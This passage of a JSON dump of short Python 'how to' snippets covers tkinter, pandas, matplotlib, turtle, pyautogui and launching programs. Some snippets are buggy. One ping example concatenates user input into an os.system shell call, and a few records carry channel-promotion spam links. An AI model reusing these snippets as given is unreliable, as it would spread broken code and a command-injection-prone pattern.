    "description": "from opponents import data import random from logos import logo, VS import os  def get_random_account():   \"\"\"Get data from random account\"\"\"   return random.choice(data)  def format_data(account):   \"\"\"Format account into printable format: name, description and country\"\"\"   name = account[\"name\"]   description = account[\"description\"]   country = account[\"country\"]   # print(f'{name}: {account[\"follower_count\"]}')   return f\"{name}, a {description}, from {country}\"  def check_answer(guess, a_followers, b_followers):   \"\"\"Checks followers against user's guess    and returns True if they got it right.   Or False if they got it wrong.\"\"\"    if a_followers > b_followers:     return guess == \"a\"   else:     return guess == \"b\"   def game():   print(logo)   score = 0   game_should_continue = True   account_a = get_random_account()   account_b = get_random_account()    while game_should_continue:     account_a = account_b     account_b = get_random_account()      while account_a == account_b:       account_b = get_random_account()      print(f\"Compare A: {format_data(account_a)}.\")     print(VS)     print(f\"Against B: {format_data(account_b)}.\")          guess = input(\"Who has more followers? Type 'A' or 'B': \").lower()     a_follower_count = account_a[\"follower_count\"]     b_follower_count = account_b[\"follower_count\"]     is_correct = check_answer(guess, a_follower_count, b_follower_count)      os.system(\"cls\")     print(logo)     if is_correct:       score += 1       print(f\"You're right! Current score: {score}.\")     else:       game_should_continue = False       print(f\"Sorry, that's wrong. Final score: {score}\")  game() \nlogo = '''                                                                                                         ,--,                                                                                           ,--.'|                     ,---,                                                              ,--,  | :  ,--,             ,--.' |                                                           ,---.'|  : ',--.'|             |  |  :                __  ,-.           ,---.    __  ,-.         |   | : _' ||  |,     ,----._,.:  :  :              ,' ,'/ /|          '   ,'\\ ,' ,'/ /|         :   : |.'  |`--'_    /   /  ' /:  |  |,--.   ,---.  '  | |' |         /   /   |'  | |' |         |   ' '  ; :,' ,'|  |   :     ||  :  '   |  /     \\ |  |   ,'        .   ; ,. :|  |   ,'         '   |  .'. |'  | |  |   | .\\  .|  |   /' : /    /  |'  :  /          '   | |: :'  :  /           |   | :  | '|  | :  .   ; ';  |'  :  | | |.    ' / ||  | '           '   | .; :|  | '            '   : |  : ;'  : |__'   .   . ||  |  ' | :'   ;   /|;  : |           |   :    |;  : |            |   | '  ,/ |  | '.'|`---`-'| ||  :  :_:,''   |  / ||  , ;            \\   \\  / |  , ;            ;   : ;--'  ;  :    ;.'__/\\_: ||  | ,'    |   :    | ---'              `----'   ---'             |   ,/      |  ,   / |   :    :`--''       \\   \\  /                                              '---'        ---`-'   \\   \\  /              `----'                                                 ,--,                 `--`-'                                                                    ,--.'|                                                                                           |  | :     ,---.           .---.            __  ,-.                                              :  : '    '   ,'\\         /. ./|          ,' ,'/ /|                                              |  ' |   /   /   |     .-'-. ' |   ,---.  '  | |' |                                              '  | |  .   ; ,. :    /___/ \\: |  /     \\ |  |   ,'                                              |  | :  '   | |: : .-'.. '   ' . /    /  |'  :  /                                                '  : |__'   | .; :/___/ \\:     '.    ' / ||  | '                                                 |  | '.'|   :    |.   \\  ' .\\   '   ;   /|;  : |                                                 ;  :    ;\\   \\  /  \\   \\   ' \\ |'   |  / ||  , ;                                                 |  ,   /  `----'    \\   \\  |--\" |   :    | ---'                                                   ---`-'              \\   \\ |     \\   \\  /                                                                              '---\"       `----'           '''  VS = '''        ,---.                    /__./|               ,---.;  ; |  .--.--.     /___/ \\  | | /  /    '    \\   ;  \\ ' ||  :  /`./     \\   \\  \\: ||  :  ;_        ;   \\  ' . \\  \\    `.      \\   \\   '  `----.   \\      \\   `  ; /  /`--'  /       :   \\ |'--'.     /         '---\"   `--'---'   '''       \ndata = [     {         'name': 'Instagram',         'follower_count': 346,         'description': 'Social media platform',         'country': 'United States'     },     {         'name': 'Cristiano Ronaldo',         'follower_count': 215,         'description': 'Footballer',         'country': 'Portugal'     },     {         'name': 'Kylie Jenner',         'follower_count': 172,         'description': 'Reality TV personality and businesswoman and Self-Made Billionaire',         'country': 'United States'     },     {         'name': 'Kim Kardashian',         'follower_count': 167,         'description': 'Reality TV personality and businesswoman',         'country': 'United States'     },     {         'name': 'Beyonc&eacute;',         'follower_count': 145,         'description': 'Musician',         'country': 'United States'     },     {         'name': 'Neymar',         'follower_count': 138,         'description': 'Footballer',         'country': 'Brasil'     },     {         'name': 'National Geographic',         'follower_count': 135,         'description': 'Magazine',         'country': 'United States'     },     {         'name': 'Justin Bieber',         'follower_count': 133,         'description': 'Musician',         'country': 'Canada'     },     {         'name': 'Taylor Swift',         'follower_count': 131,         'description': 'Musician',         'country': 'United States'     },     {         'name': 'Kendall Jenner',         'follower_count': 127,         'description': 'Reality TV personality and Model',         'country': 'United States'     },     {         'name': 'Nike',         'follower_count': 109,         'description': 'Sportswear multinational',         'country': 'United States'     },     {         'name': 'Khlo&eacute; Kardashian',         'follower_count': 108,         'description': 'Reality TV personality and businesswoman',         'country': 'United States'     },     {         'name': 'Ellen DeGeneres',         'follower_count': 87,         'description': 'Comedian',         'country': 'United States'     },     {         'name': 'Real Madrid CF',         'follower_count': 86,         'description': 'Football club',         'country': 'Spain'     },     {         'name': 'FC Barcelona',         'follower_count': 85,         'description': 'Football club',         'country': 'Spain'     },     {         'name': 'Demi Lovato',         'follower_count': 80,         'description': 'Musician and actress',         'country': 'United States'     },     {         'name': \"Victoria's Secret\",         'follower_count': 69,         'description': 'Lingerie brand',         'country': 'United States'     },     {         'name': 'Zendaya',         'follower_count': 68,         'description': 'Actress and musician',         'country': 'United States'     },     {         'name': 'Chris Brown',         'follower_count': 64,         'description': 'Musician',         'country': 'United States'     },     {         'name': 'LeBron James',         'follower_count': 63,         'description': 'Basketball player',         'country': 'United States'     },     {         'name': 'Vin Diesel',         'follower_count': 62,         'description': 'Actor',         'country': 'United States'     },     {         'name': 'Cardi B',         'follower_count': 67,         'description': 'Musician',         'country': 'United States'     },     {         'name': 'Virat Kohli',         'follower_count': 55,         'description': 'Cricketer',         'country': 'India'     },     {         'name': 'Priyanka Chopra Jonas',         'follower_count': 53,         'description': 'Actress and musician',         'country': 'India'     } ]\n",
    "reg_date": "2021-10-12T11:30:37.000Z"
  },
  {
    "id": 1776,
    "keyword": null,
    "link": null,
    "title": " how to make turtle invisible python",
    "description": "turtle.hideturtle()  #'Turtle' can be swapped for given a object name: pencil = Turtle()  # Generates turtle object named 'Pencil' pencil.hideturtle()  # Calling the '.hideturtle()' function works on pencil obj.\n",
    "reg_date": "2021-10-12T11:30:37.000Z"
  },
  {
    "id": 1777,
    "keyword": null,
    "link": null,
    "title": " how to make turtle object in python",
    "description": "import turtle satya = turtle.Turtle() maan = turtle.Turtle() #for my satya object satya.shape(\"turtle\") satya.color('blue') distance = 100 satya.forward(distance) #for my maan object maan.goto(10,200)   screen = turtle.Screen() print(screen.canvheight) screen.exitonclick() \n>>> turtle.heading() 22.0 >>> turtle.right(45) >>> turtle.heading() 337.0 \n>>> turtle.home() >>> turtle.position() (0.00,0.00) >>> turtle.heading() 0.0 >>> turtle.circle(50) >>> turtle.position() (-0.00,0.00) >>> turtle.heading() 0.0 >>> turtle.circle(120, 180)  # draw a semicircle >>> turtle.position() (0.00,240.00) >>> turtle.heading() 180.0 \n>>> turtle.pos() (440.00,-0.00) \n>>> turtle.position() (150.00,-0.00) >>> turtle.color(\"blue\") >>> astamp = turtle.stamp() >>> turtle.fd(50) >>> turtle.position() (200.00,-0.00) >>> turtle.clearstamp(astamp) >>> turtle.position() (200.00,-0.00) \n",
    "reg_date": "2021-10-12T11:30:37.000Z"
  },
  {
    "id": 1778,
    "keyword": null,
    "link": null,
    "title": " how to make wikipedia using python",
    "description": "please subscribe my channel - https://bit.ly/2Me2CfB  import wikipedia  word = str(input(\"ENTER THE WORD : \"))  print(\"WHAT DO YOU WANT TO GET OF THE WORD YOU ENTERED : \") print(\":\\t1\\tSummary\") print(\":\\t2\\tExamples\") print(\":\\t3\\tEssay\") choice = int(input(\"ENTER YOUR CHOICE : \")) if choice == 1:     print(word, \" :\")     wki1 = wikipedia.summary(word)     print(wki1) elif choice == 2:     print(word, \" :\")     wki2 = wikipedia.search(word)     print(wki2) elif choice == 3:     print(word, \" :\")     wki3 = wikipedia.page(word)     print(wki3) else:     print(\"INVALID CHOICE!!\")\n",
    "reg_date": "2021-10-12T11:30:37.000Z"
  },
  {
    "id": 1779,
    "keyword": null,
    "link": null,
    "title": " how to make your own audio book reader using python",
    "description": "import pyttsx3 import PyPDF2  book = open(\"File Name document\",\"rb\") pdfreader = PyPDF2.PdfFileReader(book) pages_in_book = pdfreader.numPages for num in range(0,pages_in_book):     page = pdfreader.getPage(num)     text = page.extractText()     speeaker = pyttsx3.init()     speeaker.say(text)     speeaker.runAndWait() #output #python will start reading your document\n",
    "reg_date": "2021-10-12T11:30:37.000Z"
  },
  {
    "id": 1780,
    "keyword": null,
    "link": null,
    "title": " how to manipulate audio in python",
    "description": "pip install pydub\n",
    "reg_date": "2021-10-12T11:30:37.000Z"
  },
  {
    "id": 1781,
    "keyword": null,
    "link": null,
    "title": " how to manke a query in google api freebusy python",
    "description": "the_datetime = tz.localize(datetime.datetime(2016, 1, 3, 0)) the_datetime2 = tz.localize(datetime.datetime(2016, 1, 4, 8)) body = {         \"timeMin\": the_datetime.isoformat(),         \"timeMax\": the_datetime2.isoformat(),         \"timeZone\": 'US/Central',         \"items\": [{\"id\": 'my.email@gmail.com'}]        } eventsResult = service.freebusy().query(body=body).execute() \n",
    "reg_date": "2021-10-12T11:30:38.000Z"
  },
  {
    "id": 1782,
    "keyword": null,
    "link": null,
    "title": " how to manually close tkinter window",
    "description": "root = tk() root.destroy()\n",
    "reg_date": "2021-10-12T11:30:38.000Z"
  },
  {
    "id": 1783,
    "keyword": null,
    "link": null,
    "title": " how to map array of string to int in python",
    "description": "results = map(int, results)\nresults = list(map(int, results))\n",
    "reg_date": "2021-10-12T11:30:38.000Z"
  },
  {
    "id": 1784,
    "keyword": null,
    "link": null,
    "title": " how to merge dataframe with different keys",
    "description": "pandas.merge(df1, df2, how='left', left_on=['id_key'], right_on=['fk_key']) \n",
    "reg_date": "2021-10-12T11:30:38.000Z"
  },
  {
    "id": 1785,
    "keyword": null,
    "link": null,
    "title": " how to merge two videos in python",
    "description": "#install moviepy via pip pip install moviepy  #We can import some python libraries before starting to merge videos. from moviepy.editor import VideoFileClip, concatenate_videoclips  #we use VideoFileClip() class create two video object, then we will merge them. video_1 = VideoFileClip(\"VideoExample1.mp4\") video_2 = VideoFileClip(\"VideoExample2.mp4\")  #Merge videos with concatenate_videoclips() final_video= concatenate_videoclips([video_1, video_2])  final_video.write_videofile(\"final_video.mp4\")\n",
    "reg_date": "2021-10-12T11:30:38.000Z"
  },
  {
    "id": 1786,
    "keyword": null,
    "link": null,
    "title": " how to migrate from sqlite to postgresql django",
    "description": "# when using sqlite3 python manage.py dumpdata > datadump.json # after chagne db python manage.py makemigrations python manage.py migrate --run-syncdb python manage.py shell from django.contrib.contenttypes.models import ContentType ContentType.objects.all().delete() quit() python manage.py loaddata datadump.json\n",
    "reg_date": "2021-10-12T11:30:38.000Z"
  },
  {
    "id": 1787,
    "keyword": null,
    "link": null,
    "title": " how to minimize command console python",
    "description": "import ctypes ctypes.windll.user32.ShowWindow( ctypes.windll.kernel32.GetConsoleWindow(), 6 )\n",
    "reg_date": "2021-10-12T11:30:38.000Z"
  },
  {
    "id": 1788,
    "keyword": null,
    "link": null,
    "title": " how to minimize tkinter window",
    "description": "import Tkinter  w = Tkinter.Tk() w.wm_state('iconic')  #or  w.iconify()\n",
    "reg_date": "2021-10-12T11:30:38.000Z"
  },
  {
    "id": 1789,
    "keyword": null,
    "link": null,
    "title": " how to move a button lower on a gui tkinter",
    "description": "button1.place(x=some_value, y=some_value)\n",
    "reg_date": "2021-10-12T11:30:39.000Z"
  },
  {
    "id": 1790,
    "keyword": null,
    "link": null,
    "title": " how to move a column in pandas dataframe",
    "description": "df = df.reindex(columns=column_names)\n# remove column 'colname' using pop() function move_column = df.pop('colname')    # insert column using insert(position,column_name, move_column) function df.insert(0, 'NewName', move_column)\ndf = df[['column1', 'column2','column3']]\n",
    "reg_date": "2021-10-12T11:30:39.000Z"
  },
  {
    "id": 1791,
    "keyword": null,
    "link": null,
    "title": " how to move a column to the beginning in dataframe",
    "description": "col = df.pop(\"Mid\") df.insert(0, col.name, col) \n",
    "reg_date": "2021-10-12T11:30:39.000Z"
  },
  {
    "id": 1792,
    "keyword": null,
    "link": null,
    "title": " how to move mouse in a cercle in python",
    "description": "import pyautogui import math  # Radius  R = 400 # measuring screen size (x,y) = pyautogui.size() # locating center of the screen  (X,Y) = pyautogui.position(x/2,y/2) # offsetting by radius  pyautogui.moveTo(X+R,Y)  for i in range(360):     # setting pace with a modulus      if i%6==0:        pyautogui.moveTo(X+R*math.cos(math.radians(i)),Y+R*math.sin(math.radians(i)))\n",
    "reg_date": "2021-10-12T11:30:39.000Z"
  },
  {
    "id": 1793,
    "keyword": null,
    "link": null,
    "title": " how to move mouse python",
    "description": "import pyautogui  pyautogui.click(100, 100) pyautogui.moveTo(100, 150) pyautogui.moveRel(0, 10)  # move mouse 10 pixels down pyautogui.dragTo(100, 150) pyautogui.dragRel(0, 10)  # drag mouse 10 pixels down\nimport pyautogui pyautogui.moveTo(100, 100, duration = 1) \nimport mouse # Number of pixels to move by on x and y axis x = 1 y = 2 mouse.move(x, y)\nimport autopy # pip install autopy autopy.mouse.smooth_move(100, 600)\n# Import modules import win32api, win32con  # Set target position tx, ty = 0, 0  # Mouse move event win32api.mouse_event(win32con.MOUSEEVENTF_MOVE | win32con.MOUSEEVENTF_ABSOLUTE, int(tx/win32api.GetSystemMetrics(0)*65535), int(ty/win32api.GetSystemMetrics(1)*65535) ,0 ,0)\n",
    "reg_date": "2021-10-12T11:30:39.000Z"
  },
  {
    "id": 1794,
    "keyword": null,
    "link": null,
    "title": " how to multiply in django template",
    "description": "You can use widthratio builtin filter for multiplication and division.  To compute A*B: {% widthratio A 1 B %}  To compute A/B: {% widthratio A B 1 %}\n",
    "reg_date": "2021-10-12T11:30:39.000Z"
  },
  {
    "id": 1795,
    "keyword": null,
    "link": null,
    "title": " how to normalize a 1d numpy array",
    "description": "# Foe 1d array an_array = np.array([0.1,0.2,0.3,0.4,0.5])  norm = np.linalg.norm(an_array) normal_array = an_array/norm print(normal_array)  #[0.2,0.4,0.6,0.8,1] (Should be, I didin't run the code)\n__code-examples__python__how_to_normalize_a_1d_numpy_array__?\n# Foe 1d array an_array = np.array([0.1,0.2,0.3,0.4,0.5])  norm = np.linalg.norm(an_array) normal_array = an_array/norm print(normal_array)  #[0.2,0.4,0.6,0.8,1] (Should be, I didin't run the code)\n",
    "reg_date": "2021-10-12T11:30:39.000Z"
  },
  {
    "id": 1796,
    "keyword": null,
    "link": null,
    "title": " how to obtain the content of brackets",
    "description": "\"\"\" This will try to split the argument into 2, using the square brackets, then will split the index one, so, the variable foo just is the content of any group of characters. like ()[]{} \"\"\" try:   foo = arg.split(\"[\")[1].split(\"]\")[0] except:     # The argument doesn't contain a class.     pass\n",
    "reg_date": "2021-10-12T11:30:39.000Z"
  },
  {
    "id": 1797,
    "keyword": null,
    "link": null,
    "title": " how to open a different version of python on my macc",
    "description": "ln -s -f /usr/local/bin/python3.7 /usr/local/bin/python \nls -l /usr/local/bin/python* \n",
    "reg_date": "2021-10-12T11:30:39.000Z"
  },
  {
    "id": 1798,
    "keyword": null,
    "link": null,
    "title": " how to open a software using python",
    "description": "please subscribe my channel - https://bit.ly/2Me2CfB  import os os.startfile(\"path_of_the_software\")\n",
    "reg_date": "2021-10-12T11:30:39.000Z"
  },
  {
    "id": 1799,
    "keyword": null,
    "link": null,
    "title": " how to open a website in python",
    "description": "import webbrowser webbrowser.open('https://www.google.co.uk/')\nimport urllib.request  try:    with urllib.request.urlopen('http://www.python.org/') as f:       print(f.read().decode('utf-8')) except urllib.error.URLError as e:    print(e.reason) print('i thik this is how u do it')\nplease subscribe my channel - https://bit.ly/2Me2CfB  import webbrowser webbrowser.open('https://bit.ly/2Me2CfB')\n",
    "reg_date": "2021-10-12T11:30:40.000Z"
  },
  {
    "id": 1800,
    "keyword": null,
    "link": null,
    "title": " how to open a window in python",
    "description": "import tkinter as tk     def new_window1():     \" new window\"     try:         if win1.state() == \"normal\": win1.focus()     except NameError as e:         print(e)         win1 = tk.Toplevel()         win1.geometry(\"300x300+500+200\")         win1[\"bg\"] = \"navy\"         lb = tk.Label(win1, text=\"Hello\")         lb.pack()     win = tk.Tk() win.geometry(\"200x200+200+100\") button = tk.Button(win, text=\"Open new Window\") button['command'] = new_window1 button.pack() win.mainloop() \n",
    "reg_date": "2021-10-12T11:30:40.000Z"
  },
  {
    "id": 1801,
    "keyword": null,
    "link": null,
    "title": " how to open any application using python",
    "description": "import os  os.system(\"program_name\") # To open any program by their name recognized by windows  # OR  os.startfile(\"path to application or any file\") # Open any program, text or office document\ndir = 'C:\\\\myprogram.exe'  import os os.startfile(dir) os.system(dir)  import subprocess subprocess.Popen([dir]) subprocess.call(dir)\n",
    "reg_date": "2021-10-12T11:30:40.000Z"
  },
  {
    "id": 1802,
    "keyword": null,
    "link": null,
    "title": " how to open any program on python",
    "description": "import os  os.system('notepad.exe') \n",
    "reg_date": "2021-10-12T11:30:40.000Z"
  },
  {
    "id": 1803,
    "keyword": null,
    "link": null,
    "title": " how to open cmd at specific location usng python",
    "description": "import os os.system(\"start cmd /K cd C:\\\\Users\\\\Name\\\\Desktop\\\\File\" )\n",
    "reg_date": "2021-10-12T11:30:40.000Z"
  },
  {
    "id": 1804,
    "keyword": null,
    "link": null,
    "title": " how to open file dialog in pytohn",
    "description": "from tkinter import Tk from tkinter.filedialog import askopenfilename  Tk().withdraw() # Added so Tk window doesn't appear on opening the dialog filePath = askopenfilename() # Full pile will be returned as string \n",
    "reg_date": "2021-10-12T11:30:40.000Z"
  },
  {
    "id": 1805,
    "keyword": null,
    "link": null,
    "title": " how to open html file in python",
    "description": "file = codecs.open(\"sample.html\", \"r\", \"utf-8\")\n",
    "reg_date": "2021-10-12T11:30:40.000Z"
  },
  {
    "id": 1806,
    "keyword": null,
    "link": null,
    "title": " how to open local html file in python",
    "description": "import codecs file = codecs.open(\"sample.html\", \"r\", \"utf-8\") print(file.read())\n",
    "reg_date": "2021-10-12T11:30:40.000Z"
  },
  {
    "id": 1807,
    "keyword": null,
    "link": null,
    "title": " how to open system apps using python",
    "description": "import pyttsx3 import subprocess  import os import time   pyttsx3.speak(\"Hi user\") time.sleep(2) pyttsx3.speak(\"you can open any apps in this coming list\") time.sleep(3) print(\"You can open any app from this list:- \")   print(\"NOTEPAD \\t GOOGLE\\nVirtual Box \\t unity \\nEXIT \")  while True:     # take input          print(\"Chat with me which app to open : \", end='')     p = input().upper()     print(p)        if (\"NOTE\" in p) or (\"NOTES\" in p) or (\"NOTEPAD\" in p) :         pyttsx3.speak(\"Opening , Notepad\")         os.system(\"notepad.exe\")                     elif (\"GOOGLE\" in p or \"CHROME\" in p):         pyttsx3.speak(\"opening chrome please wait\")         time.sleep(3)         subprocess.call(['C:/Program Files (x86)/Google/Chrome/Application/chrome'])          elif \"VIRTUAL BOX\" in p:         pyttsx3.speak(\"opening virtual box\")         subprocess.call([\"F:\\Vm\\oricle\\VirtualBox.exe\"])         #time.sleep(3)           elif \"UNITY\" in p:         pyttsx3.speak(\"Opening unity\")         subprocess.call(['D:/unity/2020.1.17f1/Editor/Unity.exe'])                   elif (\"EXIT\" in p) or (\"QUIT\" in p) or (\"CLOSE\" in p):         print(\"thanks\")         time.sleep(1)         pyttsx3.speak(\"Exiting this app thanks for using this app\")         break        else:         print(\"Is Invalid,Please Try Again\")         pyttsx3.speak(\"its Invalid,Please try again \")\n",
    "reg_date": "2021-10-12T11:30:40.000Z"
  },
  {
    "id": 1808,
    "keyword": null,
    "link": null,
    "title": " how to open webcam with python",
    "description": "import cv2  cap = cv2.VideoCapture(0)  # Check if the webcam is opened correctly if not cap.isOpened():     raise IOError(\"Cannot open webcam\")  while True:     ret, frame = cap.read()     frame = cv2.resize(frame, None, fx=0.5, fy=0.5, interpolation=cv2.INTER_AREA)     cv2.imshow('Input', frame)      c = cv2.waitKey(1)     if c == 27:         break  cap.release() cv2.destroyAllWindows()\n",
    "reg_date": "2021-10-12T11:30:40.000Z"
  },
  {
    "id": 1809,
    "keyword": null,
    "link": null,
    "title": " how to openn file dialog in tkinter",
    "description": "from tkinter import filedialog text_file=filedialog.askopenfilename(initialdir=\"D:/IT related folders and documents/\",title=\"Open Text File\",filetypes=((\"Text Files\", \"*.txt\"),))\n",
    "reg_date": "2021-10-12T11:30:41.000Z"
  },
  {
    "id": 1810,
    "keyword": null,
    "link": null,
    "title": " how to operate on all elements in a list python",
    "description": "oldlist = [1,2,3] newlist = [i * 2 for i in oldlist] print(newlist) # >>> [2, 4, 6]\n",
    "reg_date": "2021-10-12T11:30:41.000Z"
  },
  {
    "id": 1811,
    "keyword": null,
    "link": null,
    "title": " how to output on poyhton",
    "description": "print(\"Hello World!\")\n# This is a print statement print(\"Hello, world!\")\na = 3 print(a)\nprint(\"What you would like to print\") ## or variable_name = \"string\" print(variable_name)\nprint(\"Hello World!\")  >>> Hello World!\nprint(\"MOHAMMAD SHAWAKHA\")\n",
    "reg_date": "2021-10-12T11:30:41.000Z"
  },
  {
    "id": 1812,
    "keyword": null,
    "link": null,
    "title": " how to override save method in django",
    "description": "def save(self, *args, **kwargs): \tif not self.id: \t# Object is a new instance  \treturn super(Model, self).save(*args, **kwargs)\n",
    "reg_date": "2021-10-12T11:30:41.000Z"
  },
  {
    "id": 1813,
    "keyword": null,
    "link": null,
    "title": " how to parse dicts in reqparse in flask",
    "description": "self.postreqparse = reqparse.RequestParser() self.postreqparse.add_argument(\"shopping_cart\", type=dict, action=\"append\") \n",
    "reg_date": "2021-10-12T11:30:41.000Z"
  },
  {
    "id": 1814,
    "keyword": null,
    "link": null,
    "title": " how to pass a tuple to a function in python",
    "description": ">>> args = tuple(1,2,3)  >>> def function(a,b,c): ...   print(a + b + c)   >>> function(*args) #the star unwraps the tuple 6\n",
    "reg_date": "2021-10-12T11:30:41.000Z"
  },
  {
    "id": 1815,
    "keyword": null,
    "link": null,
    "title": " how to pass header in requests",
    "description": "import requests r=requests.get(\"http://www.example.com/\", headers={\"content-type\":\"text\"})\n",
    "reg_date": "2021-10-12T11:30:41.000Z"
  },
  {
    "id": 1816,
    "keyword": null,
    "link": null,
    "title": " how to pause code for some time in python",
    "description": "import time print(\"This is how to pause a program\") time.sleep(5) print(\"Did you saw that i slept for 5 seconds\")\n# To delay excusion use the time library import time  time.sleep(secs)\nimport time time.sleep(5) # Wacht 5 seconden\n",
    "reg_date": "2021-10-12T11:30:41.000Z"
  },
  {
    "id": 1817,
    "keyword": null,
    "link": null,
    "title": " how to pause in python",
    "description": "import time   # Wait for 5 seconds time.sleep(5)   # Wait for 300 milliseconds # .3 can also be used time.sleep(.300) \n>>> import time >>> time.sleep(3) # Sleep for 3 seconds \nimport time print(\"This is how to pause a program\") time.sleep(5) print(\"Did you saw that i slept for 5 seconds\")\n# To delay excusion use the time library import time  time.sleep(secs)\nimport os os.system(\"pause\")\nfrom time import sleep sleep(0.5)\n",
    "reg_date": "2021-10-12T11:30:41.000Z"
  },
  {
    "id": 1818,
    "keyword": null,
    "link": null,
    "title": " how to perform inline if in python",
    "description": "expression_if_true if condition else expression_if_false\nPython does not have a trailing if statement. There are two kinds of if in Python:  1. if statement:    if condition: statement   if condition:       block        2. if expression (introduced in Python 2.5)  \texpression_if_true if condition else expression_if_false  And note, that both print a and b = a are statements. Only the a part is an expression. So if you write   print a if b else 0    it means \tprint (a if b else 0)    and similarly when you write \tx = a if b else 0    it means \tx = (a if b else 0)    Now what would it print/assign if there was no else clause? The print/assignment is still there. And note, that if you don't want it to be there, you can always write the regular if statement on a single line, though it's less readable and there is really no reason to avoid the two-line variant.\n",
    "reg_date": "2021-10-12T11:30:41.000Z"
  },
  {
    "id": 1819,
    "keyword": null,
    "link": null,
    "title": " how to performe anova on grouped variable in python",
    "description": "# load packages import scipy.stats as stats # stats f_oneway functions takes the groups as input and returns F and P-value fvalue, pvalue = stats.f_oneway(d['A'], d['B'], d['C'], d['D']) print(fvalue, pvalue) # 17.492810457516338 2.639241146210922e-05  # get ANOVA table as R like output import statsmodels.api as sm from statsmodels.formula.api import ols # reshape the d dataframe suitable for statsmodels package  d_melt = pd.melt(d.reset_index(), id_vars=['index'], value_vars=['A', 'B', 'C', 'D']) # replace column names d_melt.columns = ['index', 'treatments', 'value'] # Ordinary Least Squares (OLS) model model = ols('value ~ C(treatments)', data=d_melt).fit() anova_table = sm.stats.anova_lm(model, typ=2) anova_table  |                |  df   | sum_sq  | mean_sq  |  F       |  PR(>F)  | |---------------|--------|---------|----------|----------|----------| | C(treatments) | 3.0    | 3010.95 | 1003.650 | 17.49281 | 0.000026 | | Residual      | 16.0   | 918.00  | 57.375   | NaN      | NaN      |  # note: if the data is balanced (equal sample size for each group), Type 1, 2, and 3 sums of squares # (typ parameter) will produce similar results. \n",
    "reg_date": "2021-10-12T11:30:42.000Z"
  },
  {
    "id": 1820,
    "keyword": null,
    "link": null,
    "title": " how to pick a random number in a list python",
    "description": "import random  #1.A single element random.choice(list)  #2.Multiple elements with replacement random.choices(list, k = 4)  #3.Multiple elements without replacement random.sample(list, 4)\nimport random  foo = ['a', 'b', 'c', 'd', 'e'] print(random.choice(foo))\nimport random choose = [\"Egg\",\"Rat\",\"Rabbit\",\"Frog\",\"Human\"] Choosen = random.choice(choose) print(Choosen)\nimport random  # there are 2 ways for this listofnum = [1, 2, 3, 4, 5] # 1 print(random.choice(listofnum))  # 2 random.shuffle(listofnum) print(listofnum)\nimport random  # with replacement = same item CAN be chosen more than once. # without replacement = same item CANNOT be chosen more then once.  # Randomly select 2 elements from list without replacement and return a list random.sample(list_name, 2)  # Randomly select 3 elements from list with replacement and return a list random.choices(set_name, k=3)  # Returns 1 random element from list random.choice(list_name)\n",
    "reg_date": "2021-10-12T11:30:42.000Z"
  },
  {
    "id": 1821,
    "keyword": null,
    "link": null,
    "title": " how to ping a website in python",
    "description": "from os import system print('1. Ping Google') print('2. Ping Yahoo') print('3. Ping custom URL') while True:     key = int(input('Input your choice: '))     if key == 1:             system(\"ping www.google.com\")     elif key == 2:             system(\"ping www.yahoo.com\")     elif key == 3:             url = input('Enter URL: ')             system(\"ping \" + url)     else:             print(\"Invalid Option!\") \nimport subprocess  def main():     host = input(\"Enter Host: \")     packet = int(input(\"\\nEnter Packet: \"))     print(\"\\n\")     ping = subprocess.getoutput(f\"ping -w {packet} {host}\")     print(ping)  main()\nst = Speedtest()     print(\"Download:=>\", st.download())     print(\"upload:=>\", st.upload())     st.get_servers([])     print(\"Ping :=>\", st.results.ping)\n",
    "reg_date": "2021-10-12T11:30:42.000Z"
  },
  {
    "id": 1822,
    "keyword": null,
    "link": null,
    "title": " how to place image in tkinter",
    "description": "from tkinter import * root=Tk() img=PhotoImage(file='sunshine.jpg') Label(root,image=img).pack() root.mainloop()\npip install Pillow\nimport tkinter as tk from PIL import Image, ImageTk  root = tk.Tk() img = Image.open(\"path\\\\to\\\\imgage.jpg\") img = img.resize((250, 250)) tkimage = ImageTk.PhotoImage(img) tk.Label(root, image=tkimage).grid()\nimport tkinter  from PIL import Image, ImageTk  load= Image.open(\"/Users/omprakash/Desktop/Gmail-new-logo.jpg\") render = ImageTk.PhotoImage(load) img = Label(root, image=render) img.place(x=100, y=100) \nimport tkinter as tk window = tk() canvas = Canvas(window, width=300, height=300) image = PhotoImage('path') canvas.create_image(height=40, width=40, img=image) \n",
    "reg_date": "2021-10-12T11:30:42.000Z"
  },
  {
    "id": 1823,
    "keyword": null,
    "link": null,
    "title": " how to plot a bar using matplotlib",
    "description": "import matplotlib.pyplot as plt          # creating the dataset  data = {'C':20, 'C++':15, 'Java':30,           'Python':35}  courses = list(data.keys())  values = list(data.values())       fig = plt.figure(figsize = (5, 5))     # creating the bar plot  plt.bar(courses, values, color ='green',           width = 0.4)     plt.xlabel(\"Courses offered\")  plt.ylabel(\"No. of students enrolled\")  plt.title(\"Students enrolled in different courses\")  plt.show() \n",
    "reg_date": "2021-10-12T11:30:42.000Z"
  },
  {
    "id": 1824,
    "keyword": null,
    "link": null,
    "title": " how to plot a graph using matplotlib",
    "description": "from matplotlib import pyplot as plt plt.plot([0, 1, 2, 3, 4, 5], [0, 1, 4, 9, 16, 25]) plt.show()\nmatplotlib Graph ------------------------------- import matplotlib.pyplot as plt   x = [1, 2, 3, 4, 5]  height = [10, 20, 30, 40, 50]  tick_label = ['one', 'two', 'three', 'four', 'five']   plt.bar(x, height, tick_label = tick_label,  \t\twidth = 0.5, color = ['red', 'green'])   plt.xlabel('x  axis')  plt.ylabel('y axis')  plt.title('matplotlib Graph')  plt.show()\nimport numpy as np import pandas as pd import matplotlib.pyplot as plt  df = pd.read_csv(\"filesc/file1.csv\") df.head()  BBox = ((df.x.min(),   df.x.max(), df.y.min(), df.y.max()))  ruh_m = plt.imread('map.png')  print(BBox)  fig, ax = plt.subplots(figsize = (8,7)) ax.scatter(df.x, df.y, zorder=1, alpha= 0.2, c='b', s=10) ax.set_title('Plotting Spatial Data on Map') ax.set_xlim(BBox[0],BBox[1]) ax.set_ylim(BBox[2],BBox[3]) ax.imshow(ruh_m, zorder=0, extent = BBox, aspect= 'equal') plt.show()  \n",
    "reg_date": "2021-10-12T11:30:42.000Z"
  },
  {
    "id": 1825,
    "keyword": null,
    "link": null,
    "title": " how to plot two columns graphs in python",
    "description": "df.plot(x='col_name_1', y='col_name_2')\nimport matplotlib.pyplot as plt  plt.plot(<X AXIS VALUES HERE>, <Y AXIS VALUES HERE>, 'line type', label='label here') plt.plot(<X AXIS VALUES HERE>, <Y AXIS VALUES HERE>, 'line type', label='label here') plt.legend(loc='best') plt.show()\n",
